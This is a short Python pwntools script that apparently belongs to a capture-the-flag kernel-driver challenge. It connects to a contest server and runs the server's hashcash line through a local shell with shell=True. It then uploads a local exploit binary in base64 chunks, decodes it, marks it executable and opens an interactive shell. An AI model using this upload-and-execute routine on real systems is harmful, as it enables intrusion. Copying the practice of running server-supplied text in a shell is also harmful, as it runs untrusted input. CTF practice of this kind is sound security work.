from pwn import *
import time
import base64
import sys
import subprocess

def run(cmd):
    io.sendlineafter("$ ", cmd)
    io.recvline()

with open("debug/rootfs/example", "rb") as f:
    payload = base64.b64encode(f.read()).decode()


io = remote("driver4b.beginners.seccon.games", 9004) # remote
# io = process("./run.sh")

cp = subprocess.run(io.recvline()[:-1].decode(), shell=True, capture_output=True)
io.sendafter(b"hashcash token: ", cp.stdout)
run('cd /tmp')

log.info("Uploading...")
for i in range(0, len(payload), 512):
    print(f"Uploading... {i:x} / {len(payload):x}")
    run('echo "{}" >> b64exp'.format(payload[i:i+512]))
run('base64 -d b64exp > exploit')
run('rm b64exp')
run('chmod +x exploit')

io.interactive()